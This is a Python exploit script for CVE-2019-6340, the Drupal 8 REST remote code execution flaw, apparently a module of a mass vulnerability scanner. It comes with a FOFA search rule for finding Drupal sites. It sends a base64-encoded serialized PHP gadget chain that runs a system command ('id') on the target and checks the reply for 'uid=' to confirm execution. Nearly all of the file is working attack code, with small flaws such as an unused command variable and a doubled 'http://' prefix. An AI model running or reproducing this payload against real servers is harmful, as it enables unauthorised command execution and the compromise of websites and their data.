#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
import base64
import re
import requests

from Config.config_requests import headers

requests.packages.urllib3.disable_warnings()

########################################################################################################################
# 脚本信息
NAME='CVE_2019_6340'
AUTHOR="RabbitMask"
REMARK='drupal8-REST-RCE'
FOFA_RULE='app="Drupal"'
########################################################################################################################
# 漏洞检测模块
def poc(target):
    result={}
    cmd='whoami'
    list = ["/node/1?_format=hal_json",
             "ewogICJsaW5rIjogWwogICAgewogICAgICAidmFsdWUiOiAibGluayIsCiAgICAgICJvcHRpb25zIjogIk86MjQ6XCJHdXp6bGVIdHRwXFxQc3I3XFxGblN0cmVhbVwiOjI6e3M6MzM6XCJcdTAwMDBHdXp6bGVIdHRwXFxQc3I3XFxGblN0cmVhbVx1MDAwMG1ldGhvZHNcIjthOjE6e3M6NTpcImNsb3NlXCI7YToyOntpOjA7TzoyMzpcIkd1enpsZUh0dHBcXEhhbmRsZXJTdGFja1wiOjM6e3M6MzI6XCJcdTAwMDBHdXp6bGVIdHRwXFxIYW5kbGVyU3RhY2tcdTAwMDBoYW5kbGVyXCI7czoyOlwiaWRcIjtzOjMwOlwiXHUwMDAwR3V6emxlSHR0cFxcSGFuZGxlclN0YWNrXHUwMDAwc3RhY2tcIjthOjE6e2k6MDthOjE6e2k6MDtzOjY6XCJzeXN0ZW1cIjt9fXM6MzE6XCJcdTAwMDBHdXp6bGVIdHRwXFxIYW5kbGVyU3RhY2tcdTAwMDBjYWNoZWRcIjtiOjA7fWk6MTtzOjc6XCJyZXNvbHZlXCI7fX1zOjk6XCJfZm5fY2xvc2VcIjthOjI6e2k6MDtyOjQ7aToxO3M6NzpcInJlc29sdmVcIjt9fSIKICAgIH0KICBdLAogICJfbGlua3MiOiB7CiAgICAidHlwZSI6IHsKICAgICAgImhyZWYiOiAiaHR0cDovL2xvY2FsaG9zdC9yZXN0L3R5cGUvc2hvcnRjdXQvZGVmYXVsdCIKICAgIH0KICB9Cn0KCg=="]
    try:
        URL = "http://" + target + list[0]
        data = base64.b64decode(list[1])
        res = requests.post(URL, data=data, headers=headers, verify=False)
        response = res.text
        p = re.compile('uid=\d')
        m = p.match(response)
        if m:
            result['target']=target
            result['poc']=NAME
            return result
    except:
        pass



if __name__ == '__main__':
    poc('http://127.0.0.1')